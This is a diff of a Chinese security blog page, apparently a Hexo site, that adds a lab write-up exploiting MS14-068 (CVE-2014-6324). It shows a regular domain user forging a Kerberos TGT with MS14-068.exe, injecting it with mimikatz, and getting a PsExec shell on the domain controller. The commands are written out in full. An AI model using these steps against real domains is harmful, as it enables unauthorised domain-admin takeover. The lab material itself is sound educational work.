@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Windows,域渗透," />
 
 
 
@@ -79,15 +79,30 @@
 
 
 
-<meta name="description" content="h4ckforjob&#39;sblog">
-<meta property="og:type" content="website">
-<meta property="og:title" content="h4ckforjob&#39;sblog">
-<meta property="og:url" content="https://h4ckforjob.github.io/tags/%E5%88%86%E5%8C%BA%E5%8A%A9%E6%89%8B/index.html">
+<meta name="description" content="背景知识MS14-068是微软在2014年11月发布的一个紧急补丁，其对应的知识库编号是KB3011780。 该补丁修复了CVE-2014-6324漏洞，该漏洞允许攻击者通过利用Kerberos KDC漏洞，将普通域用户权限提升为域管理员权限。 确认域控服务器是否安装补丁执行systeminfo | findstr 3011780，返回结果为空，则说明没安装补丁。  工具准备 exploit程序（">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透-MS14-068权限提升漏洞利用实验">
+<meta property="og:url" content="https://h4ckforjob.github.io/2025/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/index.html">
 <meta property="og:site_name" content="h4ckforjob&#39;sblog">
-<meta property="og:description" content="h4ckforjob&#39;sblog">
+<meta property="og:description" content="背景知识MS14-068是微软在2014年11月发布的一个紧急补丁，其对应的知识库编号是KB3011780。 该补丁修复了CVE-2014-6324漏洞，该漏洞允许攻击者通过利用Kerberos KDC漏洞，将普通域用户权限提升为域管理员权限。 确认域控服务器是否安装补丁执行systeminfo | findstr 3011780，返回结果为空，则说明没安装补丁。  工具准备 exploit程序（">
 <meta property="og:locale">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003200158254.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003201639494.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003201923944.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202235047.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202308878.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202543769.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203004853.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203245919.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203404168.png">
+<meta property="og:image" content="https://h4ckforjob.github.io/images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203654003.png">
+<meta property="article:published_time" content="2025-10-03T11:49:35.000Z">
+<meta property="article:modified_time" content="2025-10-03T12:37:53.468Z">
 <meta property="article:author" content="h4ckforjob">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="域渗透">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h4ckforjob.github.io/images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003200158254.png">
 
 
 
@@ -117,13 +132,13 @@
 
 
 
-  <link rel="canonical" href="https://h4ckforjob.github.io/tags/分区助手/"/>
+  <link rel="canonical" href="https://h4ckforjob.github.io/2025/10/03/域渗透-MS14-068权限提升漏洞利用实验/"/>
 
 
 
 
 
-  <title>标签: 分区助手 | h4ckforjob'sblog</title>
+  <title>域渗透-MS14-068权限提升漏洞利用实验 | h4ckforjob'sblog</title>
   
 
 
@@ -142,7 +157,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -290,54 +305,236 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>分区助手<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://h4ckforjob.github.io/2025/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="h4ckforjob'sblog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2025/04/10/%E4%BD%BF%E7%94%A8%E5%82%B2%E6%A2%85%E5%88%86%E5%8C%BA%E5%8A%A9%E6%89%8B%E6%89%A9%E5%A4%A7c%E7%9B%98/" itemprop="url">
-              
-                <span itemprop="name">使用傲梅分区助手扩大c盘</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">域渗透-MS14-068权限提升漏洞利用实验</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2025-04-10T15:00:05+08:00"
-              content="2025-04-10" >
-          04-10
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2025-10-03T19:49:35+08:00">
+                2025-10-03
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
+                    <span itemprop="name">域渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            浏览: <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span> 次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  457 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>MS14-068是微软在2014年11月发布的一个紧急补丁，其对应的知识库编号是KB3011780。 该补丁修复了CVE-2014-6324漏洞，该漏洞允许攻击者通过利用Kerberos KDC漏洞，将普通域用户权限提升为域管理员权限。</p>
+<h2 id="确认域控服务器是否安装补丁"><a href="#确认域控服务器是否安装补丁" class="headerlink" title="确认域控服务器是否安装补丁"></a>确认域控服务器是否安装补丁</h2><p>执行<code>systeminfo | findstr 3011780</code>，返回结果为空，则说明没安装补丁。</p>
+<p><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003200158254.png" alt="image-20251003200158254"></p>
+<h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ol>
+<li>exploit程序（<a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068%EF%BC%89">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068）</a></li>
+<li>psexec（<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec%EF%BC%89">https://learn.microsoft.com/en-us/sysinternals/downloads/psexec）</a></li>
+<li>mimikatz（<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz%EF%BC%89">https://github.com/gentilkiwi/mimikatz）</a></li>
+</ol>
+<h2 id="漏洞利用复现"><a href="#漏洞利用复现" class="headerlink" title="漏洞利用复现"></a>漏洞利用复现</h2><ol>
+<li><p>当前环境信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win2k8r2域控服务器IP：10.10.10.1</span><br><span class="line">加入域的win7主机IP：10.10.10.2</span><br><span class="line">普通域用户账号/密码：alice/win7user1.</span><br></pre></td></tr></table></figure></li>
+<li><p>复制所有工具到win7。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003201639494.png" alt="image-20251003201639494"></p>
+</li>
+<li><p>win7用普通域用户alice登录，测试访问域控的C盘共享，访问被拒绝。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003201923944.png" alt="image-20251003201923944"></p>
+</li>
+<li><p>使用mimikatz，执行<code>kereros::list</code>列出票据，执行<code>kerberos::purge</code>，将内存中已有的kerberos票据清除，再执行<code>kereros::list</code>确认是否清除票据。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202235047.png" alt="image-20251003202235047"><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202308878.png" alt="image-20251003202308878"></p>
+</li>
+<li><p>执行<code>whoami /all</code>查看本机用户SID。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202543769.png" alt="image-20251003202543769"></p>
+</li>
+<li><p>利用ms14-068.exe提权工具生成伪造的kerberos协议认证证书。<code>MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</code></p>
+</li>
+<li><p>实际执行<code>MS14-068.exe -u alice@test.com -s S-1-5-21-2801992062-1918021354-1617932239-1108 -d 10.10.10.1 -p win7user1.</code>，执行完毕生成TGT。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203004853.png" alt="image-20251003203004853"></p>
+</li>
+<li><p>利用mimikatz.exe将证书写入，从而提升为域管理员。执行<code>kerberos::ptc 刚才生成的tgt路径</code><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203245919.png" alt="image-20251003203245919"></p>
+</li>
+<li><p>再次列出域控制器的C盘目录，成功访问域控的C盘，说明普通域用户提权成域管理员用户成功。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203404168.png" alt="image-20251003203404168"></p>
+</li>
+<li><p>使用PSTools目录下的PsExec.exe获取shell，以域管理员权限运行连接域控。执行<code>PsExec.exe \\win2k8dc.test.com cmd.exe</code>。进入shell后，执行<code>ipconfig</code>确认是否是域控服务器IP<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203654003.png" alt="image-20251003203654003"></p>
+</li>
+</ol>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Windows/" rel="tag"># Windows</a>
+          
+            <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag"># 域渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2025/09/19/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/" rel="next" title="域渗透-搭建win2k8r2域功能级别的单域环境">
+                <i class="fa fa-chevron-left"></i> 域渗透-搭建win2k8r2域功能级别的单域环境
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -345,6 +542,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -365,8 +566,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -426,6 +636,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">背景知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A1%AE%E8%AE%A4%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%90%A6%E5%AE%89%E8%A3%85%E8%A1%A5%E4%B8%81"><span class="nav-number">2.</span> <span class="nav-text">确认域控服务器是否安装补丁</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87"><span class="nav-number">3.</span> <span class="nav-text">工具准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用复现</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -580,6 +806,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
